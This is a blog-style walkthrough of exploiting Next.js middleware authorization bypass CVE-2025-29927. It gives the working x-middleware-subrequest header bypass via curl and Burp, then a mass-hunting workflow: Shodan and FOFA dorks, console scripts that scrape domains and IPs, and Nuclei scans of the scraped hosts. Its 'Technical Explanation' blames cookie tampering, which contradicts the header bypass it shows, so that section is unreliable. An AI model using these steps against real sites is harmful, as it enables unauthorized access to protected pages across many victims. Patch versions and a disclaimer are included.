How Hackers Exploit CVE-2025–29927 in Next.js Like a Pro
Step-by-Step mass hunting Authorization Bypass by Middleware in next.js: A Complete Exploit Walkthrough
coffinxp
coffinxp

Following
7 min read
·
Apr 6, 2025
142


4






Introduction
CVE-2025–29927 is a critical vulnerability found in Next.js, the open-source web framework by Vercel that powers React based applications. It allows attackers to bypass middleware authorization, gaining access to protected resources without proper authentication. This flaw poses serious security risks, including data exposure and application compromise. In this article we’ll explore how the vulnerability works and how developers can secure their Next.js applications against it.

Understanding Next.js and Middleware
What is Next.js?
Next.js is a React-based framework that simplifies web development by providing built-in features such as server side rendering (SSR) static site generation (SSG) and API route handling. Its key features include:

Automatic Code Splitting: Faster page loads by only sending necessary JavaScript to the client.
SSR and SSG: Improved SEO and performance.
API Routes: Backend logic within the same application.
Middleware Support: Custom logic execution before reaching the route handler.
What is Middleware in Next.js?
Middleware in Next.js intercepts incoming HTTP requests and processes them before they reach the final route handler. It is commonly used for:

Authentication & Authorization: Checking if a user is logged in before granting access to certain pages.
Logging & Monitoring: Tracking requests for analytics or debugging.
Request Modification: Altering headers or query parameters before processing.
Understanding CVE-2025–29927
CVE-2025–29927 exploits an issue in Next.js middleware that allows attackers to bypass authentication and authorization checks. This occurs due to improper validation in request handling, allowing unauthorized users to gain access to protected resources.

Technical Explanation
The root cause of this vulnerability lies in middleware failing to enforce strict authentication checks. For example consider the following middleware function:

export function middleware(req) {
  if (!req.cookies.token) {
    return new Response('Unauthorized', { status: 401 });
  }
  return NextResponse.next();
}
In this setup if an attacker can manipulate the req.cookies.token value-perhaps through session fixation, cookie injection or header tampering they may be able to bypass authentication entirely.

Steps to Exploit CVE-2025–29927
While its important to focus on fixing the issue, understanding how the vulnerability is exploited can help with mitigation strategies.

Step 1: Identifying the Vulnerable Middleware
Let’s say you’re testing target.com and you suspect it’s running a vulnerable version of Next.js. The first step is to confirm whether the site is actually using Next.js. You can do this by checking the framework version using tools like the Wappalyzer browser extension.


extension will display the web framework as Next.js along with its version. Once you have the version compare it against the affected versions list for CVE-2025–29927 to determine if the site is vulnerable.

In some cases Wappalyzer might not display the Next.js version. When that happens you can try accessing endpoints like /_next/static/chunks/ or /_next/static/manifest.json to look for version leaks. Additionally check the response headers for X-Powered-By: Next.js using browser developer tools or tools like Burp Suite. You can also use the default Nuclei template for the Next.js CVE provided by the ProjectDiscovery team to automate the detection.

echo target.com | nuclei  -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml
subfinder -d target.com -all | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml
This Nuclei template will display all the affected Next.js versions as shown in the screenshot below:


Step 2: Exploiting the Vulnerable Middleware
Once a vulnerable middleware is identified attackers can manipulate HTTP requests to bypass authorization checks. Start by locating a protected endpoint such as the admin dashboard. Then use the following simple curl command to inspect the response headers. If it returns a 307 redirect to the login page, it indicates that authorization is required to access that endpoint:

 curl -v https://target.com/dashboard

* Request completely sent off
< HTTP/1.1 307 Temporary Redirect
< location: /login
< Date: Fri, 04 Apr 2025 13:55:36
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
* Connection #0 to host localhost left intact
/login                  
To exploit the vulnerability you can use the following simple curl command. It bypasses the authentication and grants access to the dashboard page:

curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://target.com/dashboard
Using Burp Suite
To exploit the vulnerability using Burp Suite, send a request to the protected endpoint in Repeater then add the following header to bypass the middleware and gain access to the dashboard page:

x-middleware-subrequest: middleware:middleware:middleware:middleware
Mass Hunting using Shodan
For mass hunting the Next.js vulnerability you can follow the approach I use. Start by going to Shodan and searching for the header x-middleware-rewrite. This will return around 15,440 results with that header present in the response an indicator of middleware usage as shown in the screenshot below:


Next, left click on the “More” option under Facet Analysis, then select the “Domain” filter just like shown in the screenshot:



After selecting the Domain filter you’ll see a list of all domains matching your search query. Now open Developer Tools by pressing F12, go to the Console tab paste the following code and hit Enter:

var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/['"]/g,'').trim();/^(\d{1,3}\.){3}\d{1,3}$/.test(t)?ips.push(t):/^(?!\d+\.)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString='IPs:\n'+ips.join('\n')+'\n\nDomains:\n'+domains.join('\n'),a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(dataString);a.download='domains.txt';document.body.appendChild(a);a.click();

After entering the code and pressing Enter you’ll get an option to save the extracted domains. Go ahead and save the file you now have all the domains from the current query. You can follow the same process to extract IP addresses as well. Just enter the code below and it will list all the IPs associated with the search results:

var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='ip.txt';document.body.appendChild(a);a.click();
Now you have two files one containing all the IPs and another with domain names. Simply clean or sort the domain list using tools like uro or manually with a text editor like Notepad. Once sorted you’re all set to run the Nuclei template on these targets to begin scanning for the vulnerability:

cat ip.txt | uro | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml
cat domains.txt | uro | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml
You’ll now have a list of potentially vulnerable targets. From here you can verify each one manually or use an automation tool to confirm the vulnerability across all targets.


You can download all the templates from my GitHub repository. I’ve included three templates including one for cache poisoning via X-Middleware-Prefetch

nuclei-templates/CVE-2025-29927.yaml at main · coffinxp/nuclei-templates
Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.
github.com

nuclei-templates/next-js.yaml at main · coffinxp/nuclei-templates
Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.
github.com

nuclei-templates/nextjs-middleware-cache.yaml at main · coffinxp/nuclei-templates
Contribute to coffinxp/nuclei-templates development by creating an account on GitHub.
github.com

Dorks
You can also try using these dorks either manually or through automation to discover more potential targets:

shodan-query:
         - shodan-query: x-middleware-rewrite
         - http.html:"/_next/static"
         - cpe:"cpe:2.3:a:zeit:next.js"
fofa-query:
         - body="/_next/static"
         - "x-middleware-rewrite"
google-dork:
         - inurl:"/_next" AND intext:"next.config.js" OR intext:"Powered by Next.js"
Impact of CVE-2025–29927
Unauthorized Data Access: Attackers could view or modify private user information.
Privilege Escalation: Unauthorized users may gain administrative access.
Application Takeover: In severe cases attackers could compromise the entire application.
Affected Versions
Any Next.js application using outdated or misconfigured middleware may be vulnerable. Developers should refer to the official security advisory to review the affected versions and apply the recommended patches.

Next.js 15.x: Upgrade to 15.2.3 or later.
Next.js 14.x: Upgrade to 14.2.25 or later.
Next.js 13.x: Upgrade to 13.5.9 or later.
Next.js 12.x: Upgrade to 12.3.5 or later.
You can also watch this video where I showed the complete lab practical of this method:


Conclusion
CVE-2025–29927 highlights the importance of secure middleware configuration and proper access control mechanisms in web applications. Developers should follow these best practices for authentication and authorization to prevent the risk of such vulnerabilities thorough Regular security audits and testing.

Upnext: If you found this helpful, you’ll definitely want to check out my article How Hackers Abuse XML-RPC to Launch Bruteforce and DDoS Attacks. It breaks down real attack techniques and how to detect or defend against them 👇

How Hackers Abuse XML-RPC to Launch Bruteforce and DDoS Attacks
From Recon to full Exploitation: The XML-RPC Attack Path
infosecwriteups.com

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
